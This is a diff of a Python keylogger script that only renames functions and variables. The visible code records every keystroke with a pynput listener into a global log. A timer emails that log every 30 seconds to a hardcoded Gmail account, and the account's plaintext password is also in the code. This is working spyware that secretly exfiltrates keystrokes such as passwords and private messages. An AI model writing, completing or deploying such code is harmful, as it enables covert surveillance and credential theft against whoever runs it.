@@ -4,7 +4,7 @@ import threading
 
 log = ""
 
-def callback_function(key):                      
+def callback(key):                      
     global log              
     try:
         log = log + key.char.encode("utf-8")   
@@ -25,14 +25,14 @@ def send_email(email,password,message):
     email_server.quit()                               
 
 
-def thread_function():          
+def thread():          
     global log                  
     send_email("blackouthacktesting@gmail.com", "testtest123456", log)
     log = ""          
-    timer_object = threading.Timer(30,thread_function)
-    timer_object.start()
+    timer = threading.Timer(30,thread)
+    timer.start()
 
-keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)        
+keylogger_listener = pynput.keyboard.Listener(on_press=callback)        
 with keylogger_listener:                                                        
-    thread_function()         
+    thread()         
     keylogger_listener.join() 
